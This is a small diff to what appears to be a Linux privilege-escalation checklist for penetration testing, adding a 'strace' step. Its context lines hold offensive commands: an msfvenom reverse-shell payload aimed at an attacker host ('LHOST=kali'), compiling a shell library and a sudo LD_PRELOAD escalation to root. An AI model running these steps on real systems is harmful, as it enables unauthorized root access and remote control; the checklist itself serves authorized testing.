@@ -27,6 +27,7 @@ functions:
         - [ ] ls -lah /etc/cron*
         - [ ] find / -iname *.bak 2>/dev/null
         - [ ] find / -iname *.backup 2>/dev/null
+        - [ ] strace <bins in sudo>
 
         User Enum:
         - [ ] whoami
@@ -74,7 +75,7 @@ functions:
           https://github.com/unkn0wnsyst3m/scripts/blob/master/shell_ldpreload.c
           gcc -fPIC -shared shell.c -o shell.so -nostartfiles
           msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali
-          
+
           sudo LD_PRELOAD=/home/user/shell.so <BIN IN SUDO -l>
 
         (Shared Library) Hijack:
